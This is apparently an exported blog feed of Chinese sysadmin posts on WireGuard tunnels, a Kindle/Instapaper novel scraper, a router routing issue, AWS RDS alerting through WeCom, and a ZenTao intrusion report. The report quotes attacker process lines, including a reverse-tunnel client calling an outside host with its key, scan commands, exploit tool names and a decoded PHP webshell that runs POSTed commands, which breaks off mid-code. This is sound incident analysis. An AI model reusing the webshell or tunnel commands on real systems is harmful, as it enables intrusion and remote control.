umask 077;cd /root;wg genkey &gt; privatekey;wg pubkey &lt; privatekey &gt; publickey;umask 022;

2.2 生成配置文件这也需要分别在两个网关上分别执行，以 10.0.1.1 上执行为例：
cat &gt;&gt; /etc/wireguard/wg_A.conf &lt;&lt;EOF[Interface]ListenPort = 36725PrivateKey = $(cat /root/privatekey)PostUp = sysctl -w net.ipv4.ip_forward=1[Peer]PublicKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=AllowedIPs = 10.0.2.0/24Endpoint = 2.2.2.2:36725PersistentKeepalive = 25EOF

稍稍解释一下：

36725：这个是 wireguard 服务所用的端口号，理论上来讲自己定就好了，不过要记得在防火墙、安全组里打开
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x3D;：这个是对端机器的 publickey，在这里就应该是 10.0.2.1 上的 &#x2F;root&#x2F;publickey 的文件内容
wg_A：这个其实也是随便取的。如果配置文件是 (&#x2F;etc&#x2F;wireguard&#x2F;)wg_A.conf，那么做 wg-quick down&#x2F;up 动作的时候，参数就应该是 wg_A
Peer 段可以有多个，代表这是一个一对多的“洞”（隧道）

10.0.2.1 上也要做类似的设置
2.3 启动 wireguard同样以 10.0.1.1 为例：
wg-quick up wg_A;

在 10.0.2.1 上则是：
wg-quick up wg_B;

这时，在 10.0.1.1 上应该能 ping 通 10.0.2.1，在 10.0.2.1 上也能 ping 通 10.0.1.1 了（如果不行，请检查 10.0.1.1 和 10.0.2.1 的防火墙安全组设置）。
2.4 其他后续工作
安全组、防火墙上打开 udp 端口 36725 的入权限
在网络 A 和 B 上分别将 10.0.2.0&#x2F;24 和 10.0.1.0&#x2F;24 的路由指向 10.0.1.1 和 10.0.2.1

做完这个后，10.0.1.0&#x2F;24 段和 10.0.2.0&#x2F;24 段之间应该完全互通了。
3 wireguard 维护这里依然以 10.0.1.1 的机器为例来谈 wireguard 服务的维护：
# 启动服务（端口）wg-quick up wg_A;# 停止服务（端口）wg-quick down wg_A;

4 Troubleshooting当出问题的时候，可以用命令：
dkms status;

来查看一下 wireguard 模块儿是否处于 installed 状态，如果没有，那么需要手工安装 wireguard 模块。手工安装时再看出了什么问题，见招拆招。多半原因是 kernel 源代码没安装，或者什么包不存在导致的。
5 多说几句前面提到，一台机器（如前面的 10.0.1.1 和 10.0.2.1）要打多个洞到不同的地方，其方法有两种：

在一个配置文件（如上面的 &#x2F;etc&#x2F;wireguard&#x2F;wg_A.conf）里写多个 Peer
在目录 &#x2F;etc&#x2F;wireguard 下用多个配置文件，比如 wg_A2B.conf、wg_A2C.conf 等

这两种方法各有什么优缺点呢？
以方案一为例：

优点是配置清爽、直观，而且只需要一个 udp 端口；
缺点是从系统层面看只会有一个 wireguard 的链路，这样以后如果做 ospf 之类的动态路由，就不太好弄了；

方案二就自己想吧：）
]]></content>
      <tags>
        <tag>tunnel</tag>
        <tag>wireguard</tag>
        <tag>dkms</tag>
        <tag>wg-quick</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Kindle 来追网文</title>
    <url>/2020/05/%E7%94%A8kindle%E8%BF%BD%E7%BD%91%E6%96%87/index.html</url>
    <content><![CDATA[用 Kindle 来追网文为嘛要干这个呢？这个说来话长，可能还是跟本人的实际情况有关系，别人可能还真没有这需求，毕竟，各种设备基本上都有 Kindle 和 Instapaper 的应用吧，直接看不香吗？所以，这里不解释，有需求的自然懂。
代码及主要思路来自于：这里


准备工作InstapaperAPI原来的代码用的是 Instapaper simple API，而我改过的是用的 Instapaper full API，所以，使用之前需要在 Instapaper 官方 先申请 token
申请通过后，会收到两个东西：

token
secret

这两样和账号密码后面程序里会用
send to Kindle 设置注册一个 Instapaper 账号并登录，点击右上角你的用户名，再选 “Settings”（或者在地址栏里直接访问这里），往下翻到 Kindle 的相关设置部分。
这里需要注意的是有两点：

需要在 Kindle 个人文档设置 里将 Instapaper 的发件地址（类似于 ‘kindle.?????@instapaper.com’ 这样，具体点击 “Your Kindle Email Address” 旁边链接：”what’s this?” 查看）加到白名单里去。
“Your Kindle Email Address” 是填你 Kindle 设备收文档的地址，在 Kindle 个人文档设置 里可以找到。

运行环境硬件这个很正常，你在哪里准备 Python 环境？你的程序写好了在哪里跑？我是跑在一个 VPS 上的。
软件这里也没什么，也就是各种依赖的包的安装，Python 版本也没啥要求，2 或 3 都应该可以，我用的是 2.7
code这部分已经更新，详见： 用 Kindle 追网文之二下面才是真正的戏肉部分，废话不说，直接上代码：
#!/usr/bin/env python# -*- coding: utf-8 -*-import timeimport requestsimport reimport os.pathimport pickleimport loggingimport sysfrom datetime import datetimefrom bs4 import BeautifulSoupfrom pyinstapaper.instapaper import Instapaper, Folder, Bookmarkreload(sys)sys.setdefaultencoding(&#x27;utf8&#x27;)# 以下四个变量根据自己的情况填写INSTAPAPER_KEY = &#x27;************************&#x27;INSTAPAPER_SECRET = &#x27;*********************&#x27;INSTAPAPER_LOGIN = &#x27;u@x.com&#x27;INSTAPAPER_PASSWORD = &#x27;password&#x27;# 几本书，用来做例子novel_list = [&quot;苏厨&quot;, &quot;王老实的幸福生活&quot;, &quot;大魔王又出手了&quot;]novel_url = [&#x27;392_392855&#x27;, &#x27;7_7669&#x27;, &#x27;431_431648&#x27;]instapaper = Instapaper(INSTAPAPER_KEY, INSTAPAPER_SECRET)instapaper.login(INSTAPAPER_LOGIN, INSTAPAPER_PASSWORD)def fetch_novel(novel_list, novel_url):    if os.path.isfile(&#x27;url.pkl&#x27;):        with open(&#x27;url.pkl&#x27;) as f:            last_url = pickle.load(f)        f.close()    else:        last_url=[[],[],[],[]]    url_archve = []    for j in range(0,len(novel_list)):        old_url=last_url[j]        url = &#x27;https://www.xinxs.la/&#x27;+novel_url[j]+&#x27;/&#x27;        urlm = &#x27;https://m.xinxs.la/&#x27;+novel_url[j]+&#x27;/&#x27;        head = &#123;&#125;        head[&#x27;User-Agent&#x27;] = &#x27;Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19&#x27;        page = requests.get(url)        soup = BeautifulSoup(page.content,&#x27;lxml&#x27;)        soup_text = soup.find_all(&quot;a&quot;, href=re.compile(&quot;\d+\.html&quot;), style=&quot;&quot;)        latest_url=[]        latest_title=[]        for i in range(0,len(soup_text)):            if &quot;/&quot; in soup_text[i][&#x27;href&#x27;]:                continue            latest_url.append(urlm + soup_text[i][&#x27;href&#x27;])            latest_title.append(novel_list[j]+&#x27;---&#x27;+soup_text[i].string.encode(&#x27;utf-8&#x27;))        for k in range(0,len(latest_url)):            if latest_url[k] in old_url:                continue            data = &#123; &#x27;time&#x27;: time.time(), &#x27;progress_timestamp&#x27;: 0, &#x27;title&#x27;: latest_title[k], &#x27;url&#x27;: latest_url[k] &#125;            bookmark = Bookmark(instapaper, **data)            bookmark.add()        old_url=latest_url        url_archive.append(old_url)    with open(&#x27;url.pkl&#x27;, &#x27;w&#x27;) as f:        pickle.dump(url_archive,f)    f.close()# 每次抓取新的文章之前，先把以前的删掉bookmarks = instapaper.get_bookmarks(&#x27;unread&#x27;)for ct, bookmark in enumerate(bookmarks):    bookmark.archive()    bookmark.delete()fetch_novel(novel_list, novel_url)

待改进的地方
目前抓链接是通过 www.xinxs.la 来直接抓的，由于其 html 代码不够规范，只能用 lxml 模块丑陋的实现了查找更新链接的工作，后来才发现了原来还有移动端适配版本：m.xinxs.la，如果这个 html 代码规范的话，我想用更优雅的方式来实现查找链接的工作

]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Kindle</tag>
        <tag>Instapaper</tag>
      </tags>
  </entry>
  <entry>
    <title>用爱快路由器碰到的一个网络问题</title>
    <url>/2019/05/%E7%94%A8%E7%88%B1%E5%BF%AB%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A2%B0%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[环境我厂大内网都是通过 wireguard 联通的，具体可以参见文章：用 wireguard 在两个网络之间打洞 能了解以前的“洞”是怎么打的，还可以参见文章：Linux 下 wireguard 出问题的解决 了解 wireguard 打洞曾经踩过的坑。


我厂办公室的上网环境大致如下图所示（IP 地址啥的都做了相应替换处理）：


10.0.0.0&#x2F;24 段是我厂办公室私网
10.0.0.1 为缺省网关，是一个爱快路由器，主机名也叫 ikuai
10.0.0.254 是 Server 这台机器的私网地址
ikuai 上有设置静态路由，将 10.0.1.0&#x2F;24 的下一跳指向了 Server(10.0.0.254)


10.0.1.0&#x2F;24 段是套路云 VPC 的私网地址
缺省网关是 10.0.1.254
10.0.1.1 是套路云的一台云主机，有公网地址，机器名是 EC2（貌似 ECS 更合适）
路由表里将 10.0.0.0&#x2F;24 的下一跳指向了 EC2 这个云主机了


Server 通过 wireguard 协议跟 EC2 链接，打通了 10.0.0.0&#x2F;24 和 10.0.1.0&#x2F;24 两个网段
ikuai 上把 wireguard 所用的 udp 端口流量转发给了 Server
EC2 上 wireguard 认的对端地址是 ikuai 的公网地址和那个转发的 udp 端口

问题表现从 10.0.0.0&#x2F;24 段的机器，比如 PC，去 ssh 10.0.1.0&#x2F;24 段的服务器的时候，一般会很慢，而且很大概率会出错：

kex_exchange_identification: read: Connection reset by peer

在 PC 上和 Server 上听包，结果发现：

三次握手的前几个包都正常
但是 PC 回给 EC2 的最后一个 ack 包被 ikuai “吃”掉了
PC 上听包发现这个包的确是发给了 ikuai（目标 mac 是 ikuai 的）
Server 又没有及时收到，正常 ikuai 应该把这个包转发到 Server 上的
最后好一点的结果就是几次重传之后，Server 收到了这个包，发给了 EC2，链接建立了，只是从表现上来看比较慢
坏的结果就直接是：Connection reset by peer。服务器直接断开链接了





结论由于 ikuai 是个黑核，我无从得知里面发上了什么，而且也曾联系了 ikuai 的客服，甚至还通过关系联系了 ikuai 的技术人员，回答也是：“不知道”，那没办法，这个锅目前来看只能是 ikuai 来背了。
解决方案其实问题并没有完全搞明白，更谈不上解决。我只能说是“绕过”了问题，办法是通过在需要连接 10.0.1.0&#x2F;24 段的机器（这里如 PC） 本地添加路由，将 10.0.1.0&#x2F;24 的下一跳强制指到 Server(10.0.0.254) 。这样做以后，问题没再发生，算是“绕过”问题了。
其实还有个方法：就是在 PC 上打开 accept_redircts，这样 PC 会接受 ikuai 发过来的 “icmp redirect” 消息，将 Server 设置为新的路由网关（效果其实等于我们直接手工添加）。但这个不太安全，所以一般都不建议打开。
其他对这个问题有经验的大佬，请不吝赐教。如需进一步的测试检测，请务必通知我配合。谢谢！
]]></content>
      <tags>
        <tag>VPC</tag>
        <tag>wireguard</tag>
        <tag>ikuai</tag>
        <tag>爱快</tag>
        <tag>accept_redirects</tag>
        <tag>secure_redirects</tag>
        <tag>打洞</tag>
        <tag>ack</tag>
      </tags>
  </entry>
  <entry>
    <title>监控 AWS 的 RDS 并通过企业微信来报警</title>
    <url>/2023/09/%E7%9B%91%E6%8E%A7%20AWS%20%E7%9A%84%20RDS%20%E5%B9%B6%E9%80%9A%E8%BF%87%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%8A%A5%E8%AD%A6/index.html</url>
    <content><![CDATA[引言监控在云资源管理中占据了核心地位，它可以帮助我们实时追踪资源状态，从而快速发现并处理潜在的问题。本文将介绍如何利用 AWS CloudWatch 监控云数据库服务RDS，并通过企业微信发送报警通知，以达到高效运维的目的。


解决方案概述本文所述的监控方案包含以下几个关键步骤：

设定 CloudWatch 告警规则，用于监控 RDS 参数并定义报警条件。
创建一个 SNS(Simple Notification Service)主题来接收 CloudWatch 的报警通知。
开发一个 Lambda 函数，用于处理 SNS 的报警通知，并将其转发到企业微信。
设置 SNS 主题触发的 Lambda 函数，以启用自动报警功能。

这里有个知识点需要了解，否则就会有困惑：RDS 的 event 是怎么到 CloudWatch 里去的呢？是这样的，RDS 基础的 Metrics 是会自动打到 CloudWatch 里去的。所以我们如果只是监控这些基础的 Metrics 的话是不用在 EventBridge 里再建规则把 RDS 的 event 打到 CloudWatch 里了。
开始之前：在企业微信中创建机器人并获取 Webhook Token在设置 AWS CloudWatch 监控和报警之前，我们需要先在企业微信中创建一个机器人，并获取它的 Webhook Token，后续步骤中将会用到。以下是创建机器人的操作步骤：

登录企业微信，并打开目标群聊。
点击群聊信息页面内的“群机器人”选项，跟随提示操作，点击“添加”按钮。
弹出页面中选择“新建”。
在新界面中设定机器人的名称，并可选择一个头像。
创建机器人后，系统会生成一个 Webhook URL，这个URL中包含了Token。
复制这个 Webhook URL，注意妥善保存，后续配置中会用到。

配置完成后，记得将获取到的 Token 添加到 AWS Lambda 的环境变量 WX_TOKEN 中。
方案具体实施步骤在获取了企业微信机器人的 Webhook Token 后，就可以开始设置我们的监控和报警系统了。该系统分为以下几个步骤：
设立 CloudWatch 报警规则首先，我们需要在 CloudWatch 中为 RDS 创建告警规则。具体步骤（以 Metric: CPUUtilization 为例）如下:

登录 AWS 管理控制台，进入 CloudWatch 服务。
在左侧菜单中选择 “告警” &gt; “所有告警”，然后点击 “创建告警”。
选择要监控的 RDS 指标，例如 “CPUUtilization”(CPU 使用率)。
设置告警阈值和条件，例如当 CPU 使用率超过 80% 时触发告警。
选择 “通过 SNS 主题发送通知”，然后选择之前创建的 SNS 主题。
设置告警名称和描述，然后点击 “创建告警”。

接下来，按照 AWS 官方关于监控的最佳实践 的说法，我们还需要继续监控如下几个 Metrics: DatabaseConnections, EBSByteBalance%, EBSIOBalance%, FreeableMemory, FreeLocalStorage, FreeStorageSpace, MaximumUsedTransactionIDs, ReadLatency, ReplicaLag, WriteLatency, DBLoad, AuroraVolumeBytesLeftTotal, AuroraBinlogReplicaLag, BlockedTransactions, BufferCacheHitRatio, EngineUptime, RollbackSegmentHistoryListLength 和 StorageNetworkThroughput，注意：这些 Metrics 不一定都同时都有的，没有的自然就跳过就好了。
创建 SNS topic接下来，我们需要创建一个 SNS 主题，用于接收 CloudWatch 的告警消息。具体步骤如下:

进入 SNS 服务，点击 “创建主题”。
输入主题名称和显示名称，然后点击 “创建主题”。
记下主题的 ARN(Amazon Resource Name)，后面会用到。

编写 Lambda function现在，我们来编写一个 Lambda 函数，用于解析 SNS 消息并发送到企业微信。以下是 Python 代码示例:
import jsonimport osfrom http.client import HTTPSConnectiondef lambda_handler(event, context):    qywx_robot_url = &quot;https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=&quot;    token = os.environ[&#x27;WX_TOKEN&#x27;]    send_url = qywx_robot_url + token    headers = &#123;        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;    &#125;    context = &quot;&quot;    try:        message = json.loads(event[&#x27;Records&#x27;][0][&#x27;Sns&#x27;][&#x27;Message&#x27;])        print(message)        # 提取报警细节        AlarmName = message[&#x27;AlarmName&#x27;]        AlarmDescription = message[&#x27;AlarmDescription&#x27;]        AWSAccountId = message[&#x27;AWSAccountId&#x27;]        NewStateValue = message[&#x27;NewStateValue&#x27;]        NewStateReason = message[&#x27;NewStateReason&#x27;]        StateChangeTime = message[&#x27;StateChangeTime&#x27;]        Region = message[&#x27;Region&#x27;]        # 提取触发报警的指标信息        Trigger = message[&#x27;Trigger&#x27;]        Namespace = Trigger[&#x27;Namespace&#x27;]        MetricName = Trigger[&#x27;MetricName&#x27;]        # 构建报警详情        detail = f&quot;Alarm Details:\n&quot; \                 f&quot;- Alarm Name: &#123;AlarmName&#125;\n&quot; \                 f&quot;- Alarm Description: &#123;AlarmDescription&#125;\n&quot; \                 f&quot;- AWS Account ID: &#123;AWSAccountId&#125;\n&quot; \                 f&quot;- Region: &#123;Region&#125;\n&quot; \                 f&quot;- Namespace: &#123;Namespace&#125;\n&quot; \                 f&quot;- Metric Name: &#123;MetricName&#125;\n&quot; \                 f&quot;- New State: &#123;NewStateValue&#125;\n&quot; \                 f&quot;- State Change Time: &#123;StateChangeTime&#125;\n&quot; \                 f&quot;- Reason for State Change: &#123;NewStateReason&#125;&quot;        title = &#x27;&lt;font color=\&quot;warning\&quot;&gt;[AWS CloudWatch Alarm]&lt;/font&gt;&#x27;        content = f&quot;&#123;title&#125;\n\n&#123;detail&#125;&quot;    except Exception as e:        print(&#x27;CloudWatch 事件告警解析异常,请检查 Lambda 代码&#x27;)        print(str(e))        content = &quot;CloudWatch 事件告警解析异常,请检查 Lambda 代码\n&quot; + str(e)    msg = &#123;        &quot;msgtype&quot;: &#x27;markdown&#x27;,        &quot;markdown&quot;: &#123;&#x27;content&#x27;: content&#125;    &#125;    conn = HTTPSConnection(&quot;qyapi.weixin.qq.com&quot;)    conn.request(&quot;POST&quot;, &quot;/cgi-bin/webhook/send?key=&quot; + token, body=json.dumps(msg), headers=headers)    response = conn.getresponse()    print(&#x27;已发送消息到企业微信&#x27;)    return response.read().decode()

代码解释在代码中，我们首先解析 SNS 消息，提取报警的各种细节，如报警名称、描述、账号 ID、区域、指标名称等。然后构建一个 Markdown 格式的消息内容，并通过企业微信的 Webhook 接口发送出去。
注意，你需要将代码中的 WX_TOKEN 替换为你自己的企业微信机器人 Token。
Lambda 函数的核心逻辑就是解析 SNS 消息，提取关键信息，然后构建企业微信消息并发送。通过使用 Markdown 格式，我们可以让消息内容更加美观和易读。
还有，为什么这里用 http.client 而不是更常用的 requests，那是因为前者是 Python 3.x 自带的模块而后者不是，所以用后者的话还需要单独再安装，这在 lambda 里就不能用直接在 web console 直接写代码这种方便明了的方式了，而是还需要在本地找个环境，把需要的包（requests）安装好，打成包，再上传上去。相对这要麻烦太多了。
将 SNS topic 与 Lambda function 绑定最后一步，我们需要将 SNS topic 与 Lambda function 关联起来。这样，当 CloudWatch 触发告警时，就会自动通过 SNS 的 topic 内容驱动调用 Lambda fuction，进而发送消息到企业微信。

进入 Lambda function 的详情页面，点击 “添加触发器”。
选择 “SNS”，然后选择之前创建的 SNS topic。
点击 “添加”，完成关联。
至此，我们就完成了使用 CloudWatch 监控 RDS 并通过企业微信报警的整个方案。当 RDS 出现异常时，你就可以第一时间收到企业微信通知，及时处理问题了。

结语通过本文，我们学习了如何使用 AWS CloudWatch 监控 RDS，并通过 SNS、Lambda 和企业微信实现报警功能。这个方案可以帮助我们及时发现和解决 RDS 的各种问题，提高系统的可用性和稳定性。
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>Python</tag>
        <tag>Lambda</tag>
        <tag>RDS</tag>
        <tag>CloudWatch</tag>
        <tag>SNS</tag>
        <tag>EventBridge</tag>
        <tag>监控</tag>
        <tag>企业微信</tag>
      </tags>
  </entry>
  <entry>
    <title>禅道（zentao）被入侵的相关信息</title>
    <url>/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html</url>
    <content><![CDATA[发现时间最早发现是 2025-05-06 下午，发现 PVE 的香港出口带宽异常，接着发现跟 176.32.35.190 的 tcp 端口 8024 有大量的数据交互
然后在 2025-05-07 上午，用 docker exec -it zentao /bin/bash 进入容器，apt install psmisc，然后 pstree -a 才确认被入侵的。
zentao 容器内执行 pstree -a 输出：
s6-svscan /etc/s6/s6-enable  |-s6-supervise 00-mysql  |   `-mysqld_safe /opt/zbox/run/mysql/mysqld_safe ...  |       `-mariadbd --defaults-file=/data/mysql/etc/my.cnf--basedir=/opt/zbox/run  |           `-13*[&#123;mariadbd&#125;]  |-s6-supervise 02-sentry  |   `-tail -f /tmp/sentry.log  |-s6-supervise 03-roadrunner  |   `-rr serve -c /apps/zentao/roadrunner/.rr.yaml  |       `-5*[&#123;rr&#125;]  |-s6-supervise 01-apache  |   `-apachectl /opt/zbox/bin/apachectl -D FOREGROUND  |       `-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |   `-sh -c ...  |           |       `-sh -c cd /tmp;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2  |           |           `-slix  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |-sh  |           |               |   `-scanb.sh ./scanb.sh  |           |               |       `-fs -h 192.168.38.0/24 -o 192b.txt -t 5 -np ...  |           |               |           `-8*[&#123;fs&#125;]  |           |               `-4*[&#123;slix&#125;]  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |   `-sh -c...  |           |       `-sh -c...  |           |           `-ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc ...  |           |               `-11*[&#123;ns&#125;]  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           |-httpd -D FOREGROUND  |           `-httpd -D FOREGROUND  `-scanb.sh ./scanb.sh      `-fs -h 192.168.39.0/24 -o 192b.txt -t 5 -np          `-8*[&#123;fs&#125;]



对比一下正常的 pstree -a 的结果吧：
s6-svscan /etc/s6/s6-enable  |-s6-supervise 00-mysql  |   `-mysqld_safe /opt/zbox/run/mysql/mysqld_safe ...  |       `-mariadbd --defaults-file=/data/mysql/etc/my.cnf--basedir=/opt/zbox/run  |           `-7*[&#123;mariadbd&#125;]  |-s6-supervise 02-sentry  |   `-run ./run  |       `-sleep 4  |-s6-supervise 03-roadrunner  |   `-run ./run  |       `-sleep 1  `-s6-supervise 01-apache      `-apachectl /opt/zbox/bin/apachectl -D FOREGROUND          `-httpd -D FOREGROUND              |-httpd -D FOREGROUND              |-httpd -D FOREGROUND              |-httpd -D FOREGROUND              |-httpd -D FOREGROUND              `-httpd -D FOREGROUND

完了，确认被黑了。
zentao 容器内执行 ps auxww | grep ns 发现输出：
nobody   3084676  0.0  0.0   2480   516 ?        S    Apr23   0:00 sh -c /bin/sh -c &quot;cd &quot;/bin&quot;;/tmp/.1/ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc -type=tcp;echo dc721;pwd;echo 291d6457e&quot; 2&gt;&amp;1nobody   3084677  0.0  0.0   2480   524 ?        S    Apr23   0:00 /bin/sh -c cd /bin;/tmp/.1/ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc -type=tcp;echo dc721;pwd;echo 291d6457enobody   3084678  0.1  0.3 858416 55708 ?        Sl   Apr23  37:05 /tmp/.1/ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc -type=tcproot     3098254  0.0  0.0   3240   648 pts/0    S+   13:20   0:00 grep ns

zentao 容器内执行 ps auxww | grep slix 输出：
nobody    975792  0.0  0.0   2480   540 ?        S    Apr17   0:00 sh -c /bin/sh -c &quot;cd &quot;/tmp&quot;;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2&quot; 2&gt;&amp;1nobody    975793  0.0  0.0   2480   544 ?        S    Apr17   0:00 /bin/sh -c cd /tmp;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2nobody    975794  0.0  0.0   5788  2936 ?        Sl   Apr17  23:43 ./slixroot     3141372  0.0  0.0   3240   648 pts/0    S+   11:21   0:00 grep slix

应急处理将被入侵容器 zentao 挪到 none 网络，然后将 zentao 容器改名
docker network disconnect chainless zentaodocker network connect none zentaodocker rename zentao zentao_hacked

继续分析基本信息zentao 容器：

ip: 172.16.0.2
image: easysoft&#x2F;zentao:21.4
publish port: 8002

zentao 容器宿主机：

ip: 192.168.0.11 or 192.168.1.11

宿主机是一台 vm，宿主机是一台有着公网地址的物理及：PVE

ip: 
a.a.a.a(香港线路接口 IP，缺省出口)
b.b.b.b(中国移动接口 IP)
192.168.0.1 和 192.168.1.1(内部网桥 ip，所有 vm 都是接在网桥上的)


nginx
做了个虚机 proxy_pass 到容器宿主机的 8002 端口，所以可以通过 PVE 的公网入口访问 zentao



whois 的信息（whois 176.32.35.190 的输出）：
% This is the RIPE Database query service.% The objects are in RPSL format.%% The RIPE Database is subject to Terms and Conditions.% See https://docs.db.ripe.net/terms-conditions.html% Note: this output has been filtered.%       To receive output for a database update, use the &quot;-B&quot; flag.% Information related to &#x27;176.32.35.0 - 176.32.35.255&#x27;% Abuse contact for &#x27;176.32.35.0 - 176.32.35.255&#x27; is &#x27;noc@baxet.ru&#x27;inetnum:        176.32.35.0 - 176.32.35.255netname:        BX-NETWORKcountry:        RUadmin-c:        DS9183-RIPEtech-c:         DS9183-RIPEstatus:         ASSIGNED PAmnt-by:         BX-NOCcreated:        2017-12-13T12:29:22Zlast-modified:  2017-12-13T12:29:22Zsource:         RIPE # Filteredperson:         Dmitry Shilyaevremarks:        https://justhost.ruaddress:        Moscow, Russiaphone:          +74956680903nic-hdl:        DS9183-RIPEmnt-by:         BX-NOCcreated:        2011-11-03T08:14:05Zlast-modified:  2020-07-26T15:49:06Zsource:         RIPE # Filtered% Information related to &#x27;176.32.35.0/24AS51659&#x27;route:          176.32.35.0/24origin:         AS51659mnt-by:         BX-NOCcreated:        2017-12-13T12:30:03Zlast-modified:  2017-12-13T12:30:03Zsource:         RIPE% This query was served by the RIPE Database Query Service version 1.117 (BUSA)

容器宿主机上执行 docker inspect zentao | grep -i privileged，输出：

        &quot;Privileged&quot;: false,


zentao_hacked(容器 zentao 改名来的) 容器内执行 ls -la /tmp 输出：
total 22972drwxrwxrwt 1 root   root        4096 May  7 13:20 .drwxr-xr-x 1 root   root        4096 Feb 19 11:12 ..drwxr-xr-x 2 nobody nogroup     4096 May  7 13:35 .1-rw-r--r-- 1 nobody nogroup      674 Apr 16 14:47 .32915ant_x64.so-rw-r--r-- 1 nobody nogroup    11565 Apr 21 11:34 12.txt-rw-r--r-- 1 nobody nogroup    18911 Apr 23 17:27 192b.txt-rw-r--r-- 1 nobody nogroup    81209 May  2 16:55 22.txtdrwxr-xr-x 3 nobody nogroup     4096 Apr 16 17:36 CVE-2021-22555-Exploit-rw-rw---- 1 nobody nogroup       56 Apr 15 20:35 adminer.invalid-rw-rw---- 1 nobody nogroup      401 Apr 20 12:21 adminer.version-rwxr-xr-x 1 nobody nogroup 10137752 Feb 23 01:32 cdk_linux_386-rwxrwxrwx 1 nobody nogroup  7100304 Apr 16 16:59 fs-rw-r--r-- 1 nobody nogroup      268 Apr 16 14:47 gconv-modules-rw-r--r-- 1    501 staff      15236 Jul 11  2024 package.xml-rw------- 1 nobody nogroup    44113 Apr 23 10:54 phpx2lUxr-rw-r--r-- 1 nobody nogroup    36381 Apr 20 17:20 result.txt-rwxr-xr-x 1 nobody nogroup  4903024 Apr 20 16:00 rustscan-rwxr-xr-x 1 nobody nogroup     1047 Apr 22 14:28 scanb.sh-rw-r--r-- 1 root   root           0 Feb 19 11:13 sentry.log-rwxr-xr-x 1 nobody nogroup  1106480 Oct 13  2023 slix

可疑文件分析zentao_hacked(容器 zentao 改名来的) 容器内执行 stat /tmp/phpx2lUxr 的输出： 

  File: &#x2F;tmp&#x2F;phpx2lUxr  Size: 44113     	Blocks: 88         IO Block: 4096   regular fileDevice: 5eh&#x2F;94d	Inode: 2374031     Links: 1Access: (0600&#x2F;-rw——-)  Uid: (65534&#x2F;  nobody)   Gid: (65534&#x2F; nogroup)Access: 2025-05-07 13:05:27.412000000 +0800Modify: 2025-04-23 10:54:16.944000000 +0800Change: 2025-04-23 10:54:16.944000000 +0800 Birth: 2025-04-23 10:54:16.944000000 +0800

/tmp/phpx2lUxr 文件太大，就不列内容了，但这是一个非常重要的文件，我们来分析一下这个文件吧
再弄个 python 程序：
# a.pyimport base64import urllib.parsewith open(&#x27;phpx2lUxr&#x27;, &#x27;r&#x27;) as f:    data = f.read()# 拆分 key=valuefor pair in data.split(&#x27;&amp;&#x27;):    if &#x27;=&#x27; in pair:        key, value = pair.split(&#x27;=&#x27;, 1)        # 先 URL 解码        value_decoded = urllib.parse.unquote(value)        # 尝试 base64 解码        try:            decoded = base64.b64decode(value_decoded).decode(&#x27;utf-8&#x27;)            # 如果解码后有明显 PHP 代码特征            if &#x27;&lt;?php&#x27; in decoded or &#x27;eval&#x27; in decoded or &#x27;base64_decode&#x27; in decoded:                print(f&#x27;Key: &#123;key&#125;\nDecoded:\n&#123;decoded&#125;\n&#x27;)        except Exception:            continue

执行：
python3 a.py

输出：

Key: bd87898bcbf27dDecoded:@ini_set(“display_errors”, “0”);@set_time_limit(0);$opdir&#x3D;@ini_get(“open_basedir”);if($opdir) {$ocwd&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);$oparr&#x3D;preg_split(base64_decode(“Lzt8Oi8&#x3D;”),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir&#x3D;$item.”&#x2F;.dd4073a3309”;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir&#x3D;realpath($tmdir);@chdir($tmdir);@ini_set(“open_basedir”, “..”);$cntarr&#x3D;@preg_split(“&#x2F;\\|/&#x2F;“,$tmdir);for($i&#x3D;0;$i&lt;sizeof($cntarr);$i++){@chdir(“..”);};@ini_set(“open_basedir”,”&#x2F;“);@rmdir($tmdir);break;};};;function asenc($out){return @base64_encode($out);};function asoutput(){$output&#x3D;ob_get_contents();ob_end_clean();echo “67”.”035”;echo @asenc($output);echo “031”.”531”;}ob_start();try{$p&#x3D;base64_decode(substr($_POST[“h82ad1117a8e69”],2));$s&#x3D;base64_decode(substr($_POST[“h51d3ad7f0190a”],2));$envstr&#x3D;@base64_decode(substr($_POST[“pb5f3a839543ad”],2));$d&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;”&#x2F;“?”-c &quot;{$s}&quot;“:”&#x2F;c 